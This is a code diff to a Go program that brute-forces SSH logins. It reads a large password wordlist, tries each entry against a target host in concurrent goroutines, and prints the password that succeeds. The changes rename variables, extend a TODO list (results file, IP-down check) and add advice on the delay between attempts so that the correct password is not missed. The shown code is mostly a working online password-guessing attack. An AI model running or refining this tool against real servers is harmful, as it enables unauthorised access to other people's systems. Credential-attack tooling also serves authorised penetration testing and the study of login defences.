@@ -2,7 +2,8 @@
 golang example to find a password for a ssh user
 using a large wordlist file.
 TODO: add args to set ipaddr, user(s), password file, adjust wait time for
-connection and check time taken running.
+connection and check time taken running, check if the ip is down, create a
+results file.
 */
 package main
 
@@ -54,8 +55,8 @@ func (f *fileScanner) GetScan() *bufio.Scanner {
 }
 
 type Dialer struct {
-	val string
-	err error
+	password string
+	err      error
 }
 
 func NewDialer() *Dialer {
@@ -63,7 +64,7 @@ func NewDialer() *Dialer {
 	return d
 }
 
-func sshdialer(password string, ch chan Dialer) *Dialer {
+func sshdialer(password string, ch chan Dialer) {
 	salida := NewDialer()
 	config := &ssh.ClientConfig{
 		User: user,
@@ -75,19 +76,16 @@ func sshdialer(password string, ch chan Dialer) *Dialer {
 	//Create dial
 	_, err := ssh.Dial("tcp", ipaddr+":"+strconv.Itoa(port), config)
 	if err != nil {
-		fmt.Printf("Failed: %s", password)
-		//chstring <- password
+		fmt.Printf("Failed: %s ---", password)
 	} else {
 		end := time.Now()
 		d := end.Sub(inittime)
 		duration := d.Seconds()
 		fmt.Printf("\n+++ Pattern found: %s +++\n", password)
 		fmt.Printf("\nCompleted in %v senconds\n", strconv.FormatFloat(duration, 'g', -1, 64))
-		//time.Sleep(180 * time.Millisecond)
 	}
-	salida.val, salida.err = password, err
+	salida.password, salida.err = password, err
 	ch <- *salida
-	return salida
 }
 
 var found bool
@@ -101,15 +99,18 @@ func main() {
 	} else {
 		scanner := fscanner.GetScan()
 		for scanner.Scan() {
-			value := scanner.Text()
-			go sshdialer(value, ch)
+			password := scanner.Text()
+			go sshdialer(password, ch)
+			// Don´t set this time lower, you need to have a proper time to get a response
+			// the response time depends in several factors, it may work with 120 Milliseconds
+			// but sometimes bypass the correct password.
 			time.Sleep(180 * time.Millisecond)
 			go func() {
 				for x := range ch {
 					if x.err != nil {
 						fmt.Printf(".")
 					} else {
-						fmt.Println("FOUND IT!!!!", x.val)
+						fmt.Println("Done!!!!, your password is: ", x.password)
 						found = true
 						return
 					}
